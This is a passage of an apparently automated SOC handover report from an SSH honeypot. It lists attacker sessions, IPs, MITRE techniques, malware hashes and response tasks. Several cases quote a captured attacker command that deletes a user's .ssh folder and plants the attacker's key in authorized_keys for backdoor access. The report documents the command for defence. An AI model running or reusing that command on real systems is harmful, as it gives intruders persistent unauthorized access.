| `2026-04-15 22:40:16` | `cowrie.command.input` |
| `2026-04-15 22:40:16` | `cowrie.command.failed` |
| `2026-04-15 22:40:16` | `cowrie.log.closed` |
| `2026-04-15 22:40:16` | `cowrie.session.params` |
| `2026-04-15 22:40:16` | `cowrie.command.input` |
| `2026-04-15 22:40:16` | `cowrie.session.file_download` |
| `2026-04-15 22:40:16` | `cowrie.log.closed` |
| `2026-04-15 22:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a1444a8c2bb

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]80` |
| **First Seen** | 2026-04-15 22:40 |
| **Last Seen** | 2026-04-15 22:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:40:19` | `cowrie.session.connect` |
| `2026-04-15 22:40:19` | `cowrie.client.version` |
| `2026-04-15 22:40:19` | `cowrie.client.kex` |
| `2026-04-15 22:40:20` | `cowrie.login.success` |
| `2026-04-15 22:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9032c6e05eed

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:41 |
| **Last Seen** | 2026-04-15 22:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:41:34` | `cowrie.session.connect` |
| `2026-04-15 22:41:34` | `cowrie.client.version` |
| `2026-04-15 22:41:34` | `cowrie.client.kex` |
| `2026-04-15 22:41:36` | `cowrie.login.success` |
| `2026-04-15 22:41:36` | `cowrie.session.params` |
| `2026-04-15 22:41:36` | `cowrie.command.input` |
| `2026-04-15 22:41:36` | `cowrie.command.failed` |
| `2026-04-15 22:41:37` | `cowrie.log.closed` |
| `2026-04-15 22:41:37` | `cowrie.session.params` |
| `2026-04-15 22:41:37` | `cowrie.command.input` |
| `2026-04-15 22:41:38` | `cowrie.session.file_download` |
| `2026-04-15 22:41:38` | `cowrie.log.closed` |
| `2026-04-15 22:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c29ba04a63a0

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:41 |
| **Last Seen** | 2026-04-15 22:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:41:41` | `cowrie.session.connect` |
| `2026-04-15 22:41:41` | `cowrie.client.version` |
| `2026-04-15 22:41:41` | `cowrie.client.kex` |
| `2026-04-15 22:41:43` | `cowrie.login.success` |
| `2026-04-15 22:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c077d49dc25

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:42 |
| **Last Seen** | 2026-04-15 22:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:42:23` | `cowrie.session.connect` |
| `2026-04-15 22:42:23` | `cowrie.client.version` |
| `2026-04-15 22:42:23` | `cowrie.client.kex` |
| `2026-04-15 22:42:24` | `cowrie.login.success` |
| `2026-04-15 22:42:25` | `cowrie.session.params` |
| `2026-04-15 22:42:25` | `cowrie.command.input` |
| `2026-04-15 22:42:25` | `cowrie.command.failed` |
| `2026-04-15 22:42:25` | `cowrie.log.closed` |
| `2026-04-15 22:42:26` | `cowrie.session.params` |
| `2026-04-15 22:42:26` | `cowrie.command.input` |
| `2026-04-15 22:42:26` | `cowrie.session.file_download` |
| `2026-04-15 22:42:26` | `cowrie.log.closed` |
| `2026-04-15 22:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-829c1c0b81de

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:42 |
| **Last Seen** | 2026-04-15 22:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:42:30` | `cowrie.session.connect` |
| `2026-04-15 22:42:30` | `cowrie.client.version` |
| `2026-04-15 22:42:30` | `cowrie.client.kex` |
| `2026-04-15 22:42:31` | `cowrie.login.success` |
| `2026-04-15 22:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45fd57e18c17

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:44 |
| **Last Seen** | 2026-04-15 22:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:44:01` | `cowrie.session.connect` |
| `2026-04-15 22:44:01` | `cowrie.client.version` |
| `2026-04-15 22:44:01` | `cowrie.client.kex` |
| `2026-04-15 22:44:02` | `cowrie.login.success` |
| `2026-04-15 22:44:03` | `cowrie.session.params` |
| `2026-04-15 22:44:03` | `cowrie.command.input` |
| `2026-04-15 22:44:03` | `cowrie.command.failed` |
| `2026-04-15 22:44:03` | `cowrie.log.closed` |
| `2026-04-15 22:44:04` | `cowrie.session.params` |
| `2026-04-15 22:44:04` | `cowrie.command.input` |
| `2026-04-15 22:44:04` | `cowrie.session.file_download` |
| `2026-04-15 22:44:04` | `cowrie.log.closed` |
| `2026-04-15 22:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ee7c8c8c6d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:44 |
| **Last Seen** | 2026-04-15 22:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:44:08` | `cowrie.session.connect` |
| `2026-04-15 22:44:08` | `cowrie.client.version` |
| `2026-04-15 22:44:08` | `cowrie.client.kex` |
| `2026-04-15 22:44:09` | `cowrie.login.success` |
| `2026-04-15 22:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f683c3ec262

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:44 |
| **Last Seen** | 2026-04-15 22:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:44:51` | `cowrie.session.connect` |
| `2026-04-15 22:44:51` | `cowrie.client.version` |
| `2026-04-15 22:44:52` | `cowrie.client.kex` |
| `2026-04-15 22:44:53` | `cowrie.login.success` |
| `2026-04-15 22:44:54` | `cowrie.session.params` |
| `2026-04-15 22:44:54` | `cowrie.command.input` |
| `2026-04-15 22:44:54` | `cowrie.command.failed` |
| `2026-04-15 22:44:54` | `cowrie.log.closed` |
| `2026-04-15 22:44:55` | `cowrie.session.params` |
| `2026-04-15 22:44:55` | `cowrie.command.input` |
| `2026-04-15 22:44:55` | `cowrie.session.file_download` |
| `2026-04-15 22:44:55` | `cowrie.log.closed` |
| `2026-04-15 22:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1340805543eb

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-15 22:44 |
| **Last Seen** | 2026-04-15 22:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 22:44:58` | `cowrie.session.connect` |
| `2026-04-15 22:44:58` | `cowrie.client.version` |
| `2026-04-15 22:44:59` | `cowrie.client.kex` |
| `2026-04-15 22:45:00` | `cowrie.login.success` |
| `2026-04-15 22:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `124.225.88[.]153` | **379** | 2026-04-15 21:17 | 2026-04-15 22:40 | 193m | 0 | `T1592` | 🟠 MEDIUM |
| `103.18.14[.]244` | **24** | 2026-04-15 22:03 | 2026-04-15 22:08 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.127[.]80` | **22** | 2026-04-15 22:28 | 2026-04-15 22:41 | 16m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.244.25[.]6` | **21** | 2026-04-15 20:56 | 2026-04-15 21:03 | 39m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.184[.]79` | **19** | 2026-04-15 20:56 | 2026-04-15 21:05 | 28m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]213` | **18** | 2026-04-15 22:31 | 2026-04-15 22:45 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.124[.]183` | **16** | 2026-04-15 21:12 | 2026-04-15 21:17 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `119.255.245[.]44` | **3** | 2026-04-15 20:56 | 2026-04-15 20:59 | 5m | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | **2** | 2026-04-15 21:09 | 2026-04-15 22:07 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.45.231[.]201` | **2** | 2026-04-15 20:56 | 2026-04-15 20:58 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `185.216.119[.]134` | 1 | 2026-04-15 22:26 | 2026-04-15 22:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]204` | 1 | 2026-04-15 21:33 | 2026-04-15 21:34 | 32s | 1 | `T1110.001` | 🟢 LOW |
| `207.188.173[.]161` | 1 | 2026-04-15 22:21 | 2026-04-15 22:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.117.79[.]36` | 1 | 2026-04-15 20:57 | 2026-04-15 20:57 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.18.14[.]244` | PK | Broadband services | **100** ⚠️ | 10 |
| `180.76.184[.]79` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `185.216.119[.]134` | HK | HongKong Cloud Plus Technology Limited | **100** ⚠️ | 50 |
| `119.255.245[.]44` | CN | Beijing Sinnet Technology Co., Ltd. | **100** ⚠️ | 50 |
| `124.225.88[.]153` | CN | FengXiang node Broad Band dialup pool-4 | **100** ⚠️ | 28 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `39.117.79[.]36` | KR | SK Broadband Co Ltd | **100** ⚠️ | 47 |
| `223.244.25[.]6` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `102.88.137[.]213` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `14.103.127[.]80` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 111 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 41 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 31 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 542 cases |
| Tool 34  | Credential Extractor        | ✅ 72 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (0.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 31 priority case(s) shown individually · 14 recon entry/entries in table (10 group(s) consolidating 506 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-15T22:47:18Z_
